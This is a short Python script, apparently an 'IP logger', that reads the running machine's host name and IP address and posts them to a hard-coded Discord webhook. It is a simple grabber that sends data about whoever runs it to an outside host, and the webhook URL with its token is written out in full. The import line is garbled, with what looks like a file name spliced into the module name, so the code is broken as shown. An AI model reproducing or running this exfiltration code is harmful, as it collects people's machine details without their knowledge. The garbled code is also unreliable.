import socket
host_name = socket.gethostname()
ip_address = socket.gethostbyname(host_name)
print("Host name: ", host_name)
print("IP Address: ", ip_address)

from discord_webpython ip logger.pyhook import DiscordWebhook, DiscordEmbed
content = "Placeholder Message"
webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1561810662068322344/Psin3WozPQwYIdkWqAyH_q8oPk62uWp_DpUh7q6_wCq2qyWuzODUUrOOzMzVi1Z7UkIq", username="JK", content=content)
embed = DiscordEmbed(title ="IP: " + ip_address + " |Host: "+ host_name, color = 123123)
webhook.add_embed(embed)
response = webhook.execute()